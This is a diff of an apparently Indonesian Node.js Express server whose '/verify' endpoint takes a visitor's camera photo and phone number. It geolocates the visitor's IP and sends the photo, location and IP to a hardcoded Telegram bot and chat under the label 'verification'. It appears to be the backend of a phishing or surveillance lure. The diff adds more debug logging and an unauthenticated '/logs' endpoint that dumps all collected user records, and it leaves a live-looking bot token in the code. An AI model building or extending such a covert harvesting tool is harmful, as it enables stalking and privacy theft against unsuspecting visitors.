@@ -6,17 +6,39 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Hardcode token
-const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
-const CHAT_ID = '7352381955';
+// AMBIL DARI ENVIRONMENT VARIABLE RAILWAY
+const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
+const CHAT_ID = process.env.CHAT_ID || '7352381955';
 
 console.log('========================================');
 console.log('🚀 SERVER STARTING');
 console.log('========================================');
-console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
-console.log(`📱 CHAT_ID: ${CHAT_ID}`);
+console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
+console.log(`🤖 Token: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'NULL'}`);
+console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
+console.log(`📱 Chat ID: ${CHAT_ID}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('========================================');
+
+// Test koneksi ke Telegram saat start
+async function testTelegramConnection() {
+  try {
+    console.log('🔍 Testing Telegram connection...');
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+    const data = await response.json();
+    if (data.ok) {
+      console.log('✅ Telegram connection: SUCCESS');
+      console.log(`🤖 Bot username: @${data.result.username}`);
+    } else {
+      console.log('❌ Telegram connection: FAILED');
+      console.log(`❌ Error: ${data.description}`);
+    }
+  } catch (err) {
+    console.log('❌ Telegram connection: ERROR');
+    console.log(`❌ ${err.message}`);
+  }
+}
+testTelegramConnection();
 
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
@@ -31,7 +53,6 @@ async function getLocationDetails(ip) {
     const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
     if (!cleanIp) return null;
     
-    // Pake ip-api.com untuk data lengkap
     const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
     const data = await res.json();
     
@@ -87,6 +108,10 @@ async function sendToTelegram(photoBuffer, locationData, phone, ip) {
     caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
     caption += `_Foto diterima untuk verifikasi_`;
 
+    console.log('📤 Sending to Telegram...');
+    console.log(`📱 Chat ID: ${CHAT_ID}`);
+    console.log(`📸 Photo size: ${photoBuffer.length} bytes`);
+
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', caption);
@@ -103,7 +128,11 @@ async function sendToTelegram(photoBuffer, locationData, phone, ip) {
     const tgData = await tgResponse.json();
     console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
     
-    // Kirim lokasi terpisah (opsional)
+    if (!tgData.ok) {
+      console.log('❌ Error details:', JSON.stringify(tgData));
+    }
+    
+    // Kirim lokasi terpisah
     if (locationData && locationData.latitude && locationData.longitude) {
       await sendLocation(locationData.latitude, locationData.longitude);
     }
@@ -182,6 +211,9 @@ app.post('/verify', async (req, res) => {
   try {
     const { image, phone } = req.body;
     
+    console.log(`📸 Image exists: ${image ? 'YES' : 'NO'}`);
+    console.log(`📸 Image length: ${image ? image.length : 0}`);
+    
     if (!image) {
       console.log('❌ No image');
       return res.json({ success: false, error: 'No image' });
@@ -235,6 +267,7 @@ app.get('/test', async (req, res) => {
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
     const data = await response.json();
+    console.log('🧪 Test endpoint hit');
     res.json(data);
   } catch (err) {
     res.json({ error: err.message });
@@ -243,6 +276,7 @@ app.get('/test', async (req, res) => {
 
 app.get('/send', async (req, res) => {
   try {
+    console.log('🧪 Testing send message...');
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -252,10 +286,20 @@ app.get('/send', async (req, res) => {
       })
     });
     const data = await response.json();
+    console.log('📨 Send test result:', data.ok ? '✅ Success' : '❌ Failed');
     res.json(data);
   } catch (err) {
     res.json({ error: err.message });
   }
+});
+
+app.get('/logs', (req, res) => {
+  res.json({ 
+    totalUsers: db.length,
+    users: db,
+    botToken: BOT_TOKEN ? '✅ SET' : '❌ NOT SET',
+    chatId: CHAT_ID ? '✅ SET' : '❌ NOT SET'
+  });
 });
 
 app.get('/', (req, res) => {
@@ -265,5 +309,8 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📊 Test bot: /test`);
+  console.log(`📊 Test send: /send`);
+  console.log(`📊 View logs: /logs`);
   console.log('========================================');
 });
